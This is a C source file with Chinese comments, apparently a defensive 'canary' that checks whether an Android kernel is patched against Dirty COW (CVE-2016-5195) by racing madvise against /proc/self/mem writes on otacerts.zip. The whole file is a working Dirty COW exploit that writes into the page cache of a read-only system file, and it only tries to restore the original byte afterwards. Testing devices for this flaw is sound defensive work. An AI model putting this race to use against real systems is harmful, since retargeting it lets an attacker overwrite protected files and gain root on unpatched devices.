/* SPDX-License-Identifier: GPL-3.0-or-later */

/*
 * dirtycow_canary —— 行为级验证 CVE-2016-5195 是否已修
 *
 * 目标文件选 /system/etc/security/otacerts.zip：
 *   - 只读、1898 字节、日常不会被读取（仅 OTA 校验时用）
 *   - 改 page cache 不落盘，重启即恢复
 *
 * 方法（标准 dirtyc0w）：
 *   线程 1：对 MAP_PRIVATE 只读映射反复 madvise(MADV_DONTNEED)
 *   线程 2：对同一虚拟地址反复 pwrite(/proc/self/mem)
 *   竞态成功 → 写入进入 page cache → 重新 open+read 能读到标记
 *
 * 判据：
 *   SUCCESS → dirtycow 未修，写原语可用
 *   FAILED  → 内核已修（pwrite 恒 EFAULT/EIO，page cache 不变）
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>

#define TARGET "/system/etc/security/otacerts.zip"
#define RUN_SECONDS 10

static volatile int g_stop;
static void *g_map;
static size_t g_len;
static off_t g_off;
static unsigned char g_marker;
static long g_writes, g_ewrites;

static void *madvise_thr(void *a)
{
	(void)a;
	while (!g_stop) {
		madvise(g_map, g_len, MADV_DONTNEED);
	}
	return NULL;
}

static void *write_thr(void *a)
{
	int mem;
	(void)a;
	mem = open("/proc/self/mem", O_RDWR);
	if (mem < 0) {
		printf("[!] open /proc/self/mem errno=%d (%s)\n", errno, strerror(errno));
		g_stop = 1;
		return NULL;
	}
	while (!g_stop) {
		ssize_t r = pwrite(mem, &g_marker, 1, (off_t)((char *)g_map + g_off));
		if (r == 1) g_writes++;
		else g_ewrites++;
	}
	close(mem);
	return NULL;
}

static int read_byte_at(const char *path, off_t off)
{
	int fd = open(path, O_RDONLY);
	unsigned char b = 0;
	ssize_t r;
	if (fd < 0) return -1;
	r = pread(fd, &b, 1, off);
	close(fd);
	return (r == 1) ? (int)b : -1;
}

int main(void)
{
	int fd, orig, now;
	struct stat st;
	pthread_t t1, t2;
	int i;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== dirtycow canary ===\n");
	printf("target = %s\n", TARGET);

	fd = open(TARGET, O_RDONLY);
	if (fd < 0) { printf("[!] open target errno=%d (%s)\n", errno, strerror(errno)); return 1; }
	if (fstat(fd, &st) < 0) { printf("[!] fstat fail\n"); close(fd); return 1; }
	g_len = st.st_size;
	printf("size = %zu\n", g_len);

	g_map = mmap(NULL, g_len, PROT_READ, MAP_PRIVATE, fd, 0);
	if (g_map == MAP_FAILED) {
		printf("[!] mmap errno=%d (%s)\n", errno, strerror(errno));
		close(fd);
		return 1;
	}
	printf("mapped at %p (PROT_READ | MAP_PRIVATE)\n", g_map);

	g_off = (off_t)g_len - 1;
	orig = read_byte_at(TARGET, g_off);
	if (orig < 0) { printf("[!] pread orig fail\n"); return 1; }
	g_marker = (unsigned char)(orig ^ 0xFF);
	printf("offset=%ld orig=%02x marker=%02x\n", (long)g_off, orig, g_marker);

	if (open("/proc/self/mem", O_RDWR) < 0) {
		printf("[!] /proc/self/mem 不可写 errno=%d (%s) —— 金丝雀无法执行\n",
		       errno, strerror(errno));
		return 2;
	}

	pthread_create(&t1, NULL, madvise_thr, NULL);
	pthread_create(&t2, NULL, write_thr, NULL);

	for (i = 0; i < RUN_SECONDS * 10 && !g_stop; i++)
		usleep(100000);

	g_stop = 1;
	pthread_join(t1, NULL);
	pthread_join(t2, NULL);

	now = read_byte_at(TARGET, g_off);
	printf("\nwrites=%ld  errors=%ld\n", g_writes, g_ewrites);
	printf("readback: orig=%02x now=%02x\n", orig, now);

	if (now == (int)g_marker) {
		printf("\n*** SUCCESS: page cache 被写穿 —— dirtycow 未修 ***\n");
		/* 尝试写回原值 */
		{
			int mem = open("/proc/self/mem", O_RDWR);
			if (mem >= 0) {
				unsigned char o = (unsigned char)orig;
				pwrite(mem, &o, 1, (off_t)((char *)g_map + g_off));
				close(mem);
			}
		}
		printf("restore attempt done, readback now=%d\n", read_byte_at(TARGET, g_off));
		return 0;
	}

	printf("\n*** FAILED: page cache 未变 —— 内核已包含 CVE-2016-5195 修复 ***\n");
	return 3;
}
